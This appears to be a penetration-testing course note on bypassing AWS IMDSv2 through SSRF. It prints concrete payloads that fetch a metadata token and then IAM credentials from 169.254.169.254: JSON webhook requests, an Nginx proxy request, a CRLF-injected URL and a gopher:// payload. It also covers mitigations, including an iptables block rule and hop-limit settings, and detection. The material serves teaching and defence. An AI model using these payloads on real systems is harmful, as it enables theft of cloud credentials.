---
tags: [aws, imdsv2, ssrf, bypass, cloud-security, pentesting]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.25 IMDSv2 Bypass"
---

# 25 - IMDSv2 Bypass Techniques

## Introduction to IMDSv2 Security Mechanisms

Amazon Web Services (AWS) introduced Instance Metadata Service Version 2 (IMDSv2) to address the rampant exploitation of Server-Side Request Forgery (SSRF) vulnerabilities that plagued IMDSv1. IMDSv1 required a simple `GET` request to retrieve sensitive instance metadata, including temporary IAM credentials. If an attacker found an SSRF vulnerability that allowed making a `GET` request and returning the response, they could easily compromise the instance's IAM role.

IMDSv2 completely overhauled this trust model by introducing session-oriented requests. To fetch metadata from IMDSv2, a client must first obtain a session token by making an HTTP `PUT` request. This token must then be included as a specific HTTP header (`X-aws-ec2-metadata-token`) in subsequent `GET` requests.

The core defense mechanisms of IMDSv2 are:
1. **HTTP PUT Requirement**: Prevents simple `GET`/`POST` based SSRF where the attacker cannot control the HTTP method.
2. **Custom Headers**: Requires the `X-aws-ec2-metadata-token-ttl-seconds` header to get the token, and the `X-aws-ec2-metadata-token` header to use it. Many SSRF vulnerabilities do not allow arbitrary header injection.
3. **Hop Limit (TTL)**: The IP TTL (Time To Live) for the token request is set to `1` by default. This means the packet will be dropped if it passes through any router. This specifically targets SSRF via containerized applications (like Docker) where traffic is routed from the container's virtual network interface to the EC2 host interface.

Despite these robust defenses, IMDSv2 is not a silver bullet. Under specific conditions, and with certain types of application vulnerabilities, IMDSv2 can be bypassed.

## Architecture and Interaction Flow

The following ASCII diagram illustrates the intended flow of IMDSv2 compared to bypass scenarios.

```text
+-----------------------+                            +-------------------------+
|   Standard App Flow   |                            |   AWS IMDSv2            |
|-----------------------|                            |   (169.254.169.254)     |
| 1. PUT /latest/api/   | -------------------------> |                         |
|    token (TTL header) |                            |                         |
|                       | <------------------------- | 2. Returns Token        |
| 3. GET /meta-data/    |                            |                         |
|    (Token header)     | -------------------------> |                         |
|                       | <------------------------- | 4. Returns Credentials  |
+-----------------------+                            +-------------------------+

+-----------------------+                            +-------------------------+
|   Attacker via SSRF   |                            |   AWS IMDSv2            |
|-----------------------|                            |   (169.254.169.254)     |
| 1. Attacker controls  |                            |                         |
|    Proxy/WAF config   |                            |                         |
| 2. App proxies full   | -------------------------> |                         |
|    request (incl PUT) |    (Bypass via Proxy)      |                         |
+-----------------------+                            +-------------------------+
```

## Vulnerability Conditions for Bypass

To successfully bypass IMDSv2 and extract metadata via an application, the underlying vulnerability must possess specific characteristics. A simple URL-fetching SSRF (like an application fetching an image from a user-supplied URL) is insufficient.

The attacker needs:
1. **Method Control**: The ability to force the application to make an HTTP `PUT` request.
2. **Header Injection**: The ability to inject custom HTTP headers into the outbound request.
3. **Response Reading**: The ability to read the response of the `PUT` request to extract the generated token.
4. **Follow-up Requests**: The ability to make a second request (`GET`) using the newly acquired token in the headers.

If *all* these conditions are met, the SSRF is powerful enough to interact with IMDSv2. Let's explore the techniques used to achieve this in practice.

## Bypass Technique 1: Full-Featured SSRF / HTTP Proxies

The most direct bypass occurs when the SSRF vulnerability is inherently full-featured. This happens when an application acts as an HTTP proxy or uses a highly configurable HTTP client library where user input controls not just the URL, but the entire HTTP request object.

### Example: Vulnerable Node.js Application

Consider a debugging endpoint or a webhook testing tool built in Node.js that takes a JSON object defining the request:

```json
POST /api/webhook-tester HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/api/token",
  "method": "PUT",
  "headers": {
    "X-aws-ec2-metadata-token-ttl-seconds": "21600"
  }
}
```

If the application uses this JSON to blindly construct an outbound request using `axios` or `node-fetch`, the attacker easily obtains the IMDSv2 token.

**The Attack Chain:**
1. Send the above request. The application returns the token (e.g., `AQAAAB...`).
2. Send a second request using the token:

```json
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role",
  "method": "GET",
  "headers": {
    "X-aws-ec2-metadata-token": "AQAAAB..."
  }
}
```

## Bypass Technique 2: Reverse Proxy Misconfigurations (Nginx/Apache)

Misconfigured reverse proxies are a prime target for IMDSv2 bypasses. If a reverse proxy allows an attacker to control the backend destination URL, the proxy client often passes along the original HTTP method and headers sent by the attacker.

### Example: Nginx `proxy_pass` SSRF

Imagine an Nginx configuration designed to route traffic based on a header or query parameter (a dangerous anti-pattern):

```nginx
location /proxy/ {
    resolver 8.8.8.8;
    proxy_pass http://$arg_target;
}
```

An attacker can interact with this Nginx server directly. Because they are making the HTTP request to Nginx, they control the method and the headers. Nginx will forward these to the target.

**Attacker Request to Nginx:**
```http
PUT /proxy/?target=169.254.169.254/latest/api/token HTTP/1.1
Host: vulnerable-app.com
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

Nginx forwards the `PUT` request and the custom header to `169.254.169.254`. The IMDS responds with the token, which Nginx relays back to the attacker. The attacker then repeats the process with a `GET` request and the token header.

## Bypass Technique 3: CRLF Injection (HTTP Request Smuggling/Splitting)

If the SSRF vulnerability only allows controlling the URL (e.g., a simple `GET` request), but the backend HTTP client is vulnerable to Carriage Return Line Feed (CRLF) injection, an attacker might be able to inject headers or smuggle a secondary request.

This relies on injecting `%0D%0A` (`\r\n`) sequences into the URL to break out of the URL path and start writing HTTP headers or entirely new HTTP requests.

### Example of CRLF for Header Injection

If the application takes a URL: `http://vulnerable-app.com/fetch?url=http://example.com`

The application constructs an outbound request:
```http
GET / HTTP/1.1
Host: example.com
```

The attacker injects a CRLF sequence to add the IMDSv2 header, assuming they can also force a PUT method (which makes this rare, but possible if the app uses PUT by default for the specific endpoint):
`url=http://169.254.169.254/latest/api/token HTTP/1.1%0D%0AX-aws-ec2-metadata-token-ttl-seconds: 21600%0D%0AIgnore:`

The resulting backend request might look like:
```http
PUT /latest/api/token HTTP/1.1
X-aws-ec2-metadata-token-ttl-seconds: 21600
Ignore: HTTP/1.1
Host: 169.254.169.254
```
*(Note: Achieving both PUT method control and CRLF simultaneously is rare, but if the endpoint is an update/upload function that uses PUT, CRLF can inject the required TTL header).*

## Bypass Technique 4: SSRF via Gopher Protocol

If the vulnerable application uses an HTTP client (like cURL in PHP or older versions of libcurl) that supports the `gopher://` protocol, SSRF becomes drastically more dangerous.

The `gopher://` protocol allows an attacker to specify arbitrary bytes to be sent over a TCP connection. This means the attacker can craft the exact HTTP request (Method, Headers, Body) byte-for-byte.

**Constructing the Gopher Payload:**
The attacker wants to send:
```http
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600

```

They URL-encode this for the Gopher payload:
`gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0AHost:%20169.254.169.254%0AX-aws-ec2-metadata-token-ttl-seconds:%2021600%0A%0A`

If the application fetches this URL:
`http://vulnerable-app.com/fetch?url=gopher://169.254.169.254:80/_...`

The application will make the exact TCP connection and send the payload, resulting in a successful `PUT` request to IMDSv2.

## The Container Hop Limit Problem

AWS recognized that many SSRF vulnerabilities exist in applications running inside Docker containers. Because Docker uses bridge networks, a request from a container to `169.254.169.254` has to be routed from the container's virtual network interface (e.g., `docker0`) to the EC2 host's primary interface (`eth0`).

This routing decrements the IP packet's Time To Live (TTL). IMDSv2 enforces a default `HttpPutResponseHopLimit` of `1`.
When the container sends the request, the TTL is 1. When it hits the Docker bridge, the router decrements it to 0 and drops the packet. Therefore, containers cannot access IMDSv2 by default unless the administrator explicitly increases the hop limit.

### Bypassing the Hop Limit

From an attacker's perspective, if you only have SSRF, you cannot bypass the hop limit. The network stack drops the packet before it reaches the IMDS.

However, if an attacker achieves **Remote Code Execution (RCE)** inside the container, they might be able to bypass this.
If the container is running with `--net=host` (host networking mode), there is no routing hop. The container shares the host's network namespace, and IMDSv2 access succeeds perfectly.

If the attacker has RCE in a standard bridge container, they cannot modify the hop limit of the EC2 instance. They must rely on finding a container escape or privilege escalation to break out of the container network namespace.

## Mitigation and Defense in Depth

Relying solely on IMDSv2 is insufficient if your application contains full-featured SSRF vulnerabilities. Defense in depth is required.

### 1. Require IMDSv2 and Enforce Hop Limits
Ensure IMDSv1 is entirely disabled.
```bash
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```
Keep the hop limit at 1 unless absolutely necessary for specific containerized workloads (like specific EKS setups).

### 2. Implement Strict Network Firewalls (iptables)
Even with IMDSv2, the most robust defense against SSRF is blocking the application layer from ever communicating with `169.254.169.254`.

If your application runs as the user `www-data`, you can use `iptables` to block that specific user from accessing the IMDS:
```bash
iptables -A OUTPUT -m owner --uid-owner www-data -d 169.254.169.254 -j DROP
```
This ensures that even if an attacker finds a Gopher SSRF or full-featured proxy SSRF, the network layer will drop the packet originating from the vulnerable application process.

### 3. Application-Level Defenses against SSRF
- **Allowlisting**: Only allow the application to fetch URLs from a strict list of known-good domains.
- **Protocol Disabling**: Disable dangerous protocols like `gopher://`, `file://`, and `dict://` in your HTTP client libraries (e.g., in cURL or Java `HttpURLConnection`).
- **Input Validation**: Never trust user input to construct full URLs or control HTTP methods and headers without rigorous sanitization.

## Detection and Logging

Detecting IMDSv2 bypass attempts involves monitoring both application logs and cloud infrastructure logs.

- **CloudTrail**: Monitor for `RunInstances` or `ModifyInstanceMetadataOptions` events where `HttpTokens` is set to `optional` (indicating a downgrade to IMDSv1).
- **VPC Flow Logs**: Monitor traffic to `169.254.169.254:80`. While you will see legitimate traffic, look for spikes or traffic originating from specific application instances that shouldn't normally be polling metadata.
- **Application APM/WAF**: Configure Web Application Firewalls to alert on incoming requests containing the string `169.254.169.254` or `latest/api/token` in headers, query parameters, or JSON payloads. Alert heavily on any request containing the `X-aws-ec2-metadata-token-ttl-seconds` header originating externally.

## Chaining Opportunities

- **Initial Access**: Bypass techniques are crucial during `[[27 - Cloud SSRF to Credential Theft — Full Chain]]` when an application is secured behind IMDSv2.
- **Enumeration**: Once bypassed, the tokens are fed into `[[26 - Cloud Enumeration Tools]]`.
- **Privilege Escalation**: Fits directly into standard cloud lateral movement techniques after extracting the IAM role.

## Deep Dive: Advanced Real-World Scenarios and Case Studies

In advanced penetration testing engagements, simplistic vulnerabilities are rarely found in isolation. Instead, attackers must chain multiple low-severity issues to achieve critical impact. The complexity of modern cloud architectures often obscures these attack paths from defenders, while providing numerous opportunities for patient adversaries.

Consider a scenario where an organization implements strict IAM policies but neglects network-level egress controls. An attacker might exploit a minor Server-Side Request Forgery (SSRF) vulnerability that, due to strict IAM, yields a token with seemingly useless permissions. However, by thoroughly enumerating the environment using tools discussed previously, the attacker discovers an obscure, legacy API endpoint internal to the VPC. This endpoint, trusting any request originating from within the network, allows the attacker to manipulate database records.

This illustrates a fundamental principle in cloud security: identity is the new perimeter, but network controls still provide critical defense-in-depth. A failure in either domain can lead to a complete compromise.

Furthermore, the operational tempo of cloud deployments—where Infrastructure as Code (IaC) pipelines deploy changes multiple times a day—frequently introduces transient vulnerabilities. A permission granted temporarily for debugging might be accidentally committed to the main branch, exposing a highly privileged role for just a few hours. Advanced adversaries automate their reconnaissance to detect and exploit these fleeting windows of opportunity.

To combat this, defensive teams must adopt an "assume breach" mentality. This means implementing continuous monitoring of control plane logs (like AWS CloudTrail or Azure Activity Logs), utilizing anomaly detection to spot unusual API call patterns, and conducting regular red team exercises to validate the effectiveness of security controls. The notes in this module provide the offensive perspective necessary to design these robust, resilient cloud architectures.

### The Role of Infrastructure as Code (IaC) in Security Posture

Modern cloud infrastructure is almost entirely defined by code using tools like Terraform, Pulumi, or AWS CloudFormation. While IaC brings immense benefits in terms of reproducibility and scale, it also codifies vulnerabilities if not properly secured. A single misconfiguration in a Terraform module—such as overly permissive security group rules or an exposed storage bucket—can be replicated across dozens of environments instantly.

During penetration tests, gaining access to the IaC repository is often a critical objective. Analyzing the code provides a comprehensive map of the target environment without needing to interact with the cloud provider's APIs, avoiding detection by logging mechanisms like CloudTrail. Furthermore, identifying hardcoded credentials or overly broad IAM roles within the IaC code can highlight direct paths to privilege escalation.

Securing IaC requires integrating security scanning tools directly into the CI/CD pipeline. Solutions like Checkov, tfsec, or OPA (Open Policy Agent) can automatically enforce security policies and block deployments that violate organizational standards. By shifting security left and addressing vulnerabilities at the code level, organizations can prevent misconfigurations from ever reaching production environments.

### Zero Trust Architecture in the Cloud

The concept of Zero Trust is fundamental to modern cloud security. Unlike traditional perimeter-based security models, Zero Trust assumes that the network is always hostile and that internal traffic is no more trustworthy than external traffic. Every request must be authenticated, authorized, and continuously validated, regardless of its origin.

In the context of cloud infrastructure, implementing Zero Trust involves several key practices:
- **Micro-segmentation:** Dividing the cloud environment into small, isolated zones to limit lateral movement in the event of a breach.
- **Identity-Aware Proxy (IAP):** Using a proxy to verify the identity and context of every request before granting access to internal applications.
- **Continuous Monitoring:** Analyzing logs and network traffic in real-time to detect anomalous behavior and respond to threats quickly.
- **Just-in-Time (JIT) Access:** Granting privileges only when they are needed and revoking them immediately after the task is completed, minimizing the window of opportunity for an attacker.

By adopting a Zero Trust mindset, organizations can significantly enhance their resilience against advanced threats and minimize the impact of potential security incidents.

### Summary of the Threat Landscape

The cloud threat landscape is constantly evolving, with attackers continually developing new techniques to bypass security controls. As cloud environments become more complex, the potential attack surface expands, making it increasingly challenging to secure.

Organizations must stay vigilant and continuously adapt their security posture to address emerging threats. This requires a proactive approach, incorporating regular security assessments, penetration testing, and threat modeling. By understanding the tactics, techniques, and procedures (TTPs) used by adversaries, defenders can implement targeted mitigations and improve their overall security posture.

Ultimately, cloud security is a shared responsibility between the cloud provider and the customer. While the provider is responsible for securing the underlying infrastructure, the customer is responsible for securing their applications, data, and configurations. Understanding this shared responsibility model is essential for designing and maintaining a secure cloud environment.

## Related Notes

- `[[24 - Cloud Metadata Endpoint Cheat Sheet]]`
- `[[27 - Cloud SSRF to Credential Theft — Full Chain]]`
- `[[26 - Cloud Enumeration Tools]]`
